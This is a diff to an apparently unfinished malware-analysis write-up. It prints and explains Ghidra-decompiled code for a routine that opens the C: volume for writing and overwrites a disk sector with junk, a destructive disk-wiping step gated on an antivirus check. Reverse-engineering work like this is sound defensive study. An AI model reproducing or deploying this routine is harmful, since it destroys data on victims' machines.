@@ -1699,6 +1699,78 @@ Next we move on to the second function inside the if statement in `Oridinal_1`.
 
 ### FUN_10008d5a
 
+```cpp
+void FUN_10008d5a(void){
+  HANDLE hDevice;
+  BOOL BVar1;
+  HLOCAL lpBuffer;
+  int iVar2;
+  DWORD local_24;
+  undefined local_20 [20];
+  DWORD local_c;
+  
+  hDevice = CreateFileA("\\\\.\\C:",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
+  if (hDevice != (HANDLE)0x0) {
+    BVar1 = DeviceIoControl(hDevice,0x70000,(LPVOID)0x0,0,local_20,0x18,&local_24,(LPOVERLAPPED)0x0)
+    ;
+    if ((BVar1 != 0) && (lpBuffer = LocalAlloc(0,local_c * 10), lpBuffer != (HLOCAL)0x0)) {
+      SetFilePointer(hDevice,local_c,(PLONG)0x0,0);
+      WriteFile(hDevice,lpBuffer,local_c,&local_24,(LPOVERLAPPED)0x0);
+      LocalFree(lpBuffer);
+    }
+    CloseHandle(hDevice);
+  }
+  if (((detected_anti_virus & 8) != 0) && (iVar2 = FUN_100014a9(), iVar2 == 0)) {
+    return;
+  }
+  FUN_10008cbf();
+  return;
+}
+```
+
+The first thing we see in this function is that `C:` drive is opened as a file with `0x40000000` meaning `GENERIC_WRITE`. If this handle was succesfully obtained a call is made to [DeviceIoControl](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol), this function directly sends a control code to the specified device driver. In this case we see that the control code being sent is `0x70000`. We [figure out](http://www.ioctls.net/) that this means [IOCTL_DISK_GET_DRIVE_GEOMETRY](https://docs.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-ioctl_disk_get_drive_geometry). As per the MSDN docs this returns:
+
+> Retrieves information about the physical disk's geometry: type, number of cylinders, tracks per cylinder, sectors per track, and bytes per sector.
+
+The result of this call is stored in `local_20` and the total number of returned bytes is stored in `local_24`. Next we see a buffer being allocated for `10 * local_c` bytes. This variable however does not have a value as far as we can tell. This might be because `local_24`, `local_20` and `local_c` are supposed to represent the same structure but were not recognized as such by Ghidra as `local_20` has an undefined type.
+
+Next we see a call to [SetFilePointer](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfilepointer). This subroutine call moves the given file pointer, the distance to move by is `local_c`.
+
+We now realize something. `DeviceIoControl` was called with buffer `local_20`, this buffer has size `20` but is indicated to have size `0x18` which is `24`. A `DWORD` however has `4` bytes. This means that `local_20` and `local_c` most likely refer to the same memory block. However `local_c` got singled out due to being used as a `DWORD` later on. All in all this means that `local_c` contains the last `DWORD` returned by `IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL`. Some more searching reveals the type of `local_20` and `local_c` this being the [DISK_GEOMETRY](https://docs.microsoft.com/en-us/windows/win32/api/winioctl/ns-winioctl-disk_geometry) structure. Retyping the local variables massively cleans up the decompilation.
+
+```cpp
+void FUN_10008d5a(void){
+  HANDLE hDevice;
+  BOOL BVar1;
+  HLOCAL lpBuffer;
+  int iVar2;
+  DWORD geo_size;
+  DISK_GEOMETRY local_20;
+  
+  hDevice = CreateFileA("\\\\.\\C:",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
+  if (hDevice != (HANDLE)0x0) {
+    BVar1 = DeviceIoControl(hDevice,0x70000,(LPVOID)0x0,0,&local_20,0x18,&geo_size,(LPOVERLAPPED)0x0
+                           );
+    if ((BVar1 != 0) &&
+       (lpBuffer = LocalAlloc(0,local_20.BytesPerSector * 10), lpBuffer != (HLOCAL)0x0)) {
+      SetFilePointer(hDevice,local_20.BytesPerSector,(PLONG)0x0,0);
+      WriteFile(hDevice,lpBuffer,local_20.BytesPerSector,&geo_size,(LPOVERLAPPED)0x0);
+      LocalFree(lpBuffer);
+    }
+    CloseHandle(hDevice);
+  }
+  if (((detected_anti_virus & 8) != 0) && (iVar2 = FUN_100014a9(), iVar2 == 0)) {
+    return;
+  }
+  FUN_10008cbf();
+  return;
+}
+```
+
+
+
+
+
 
 
 TODO
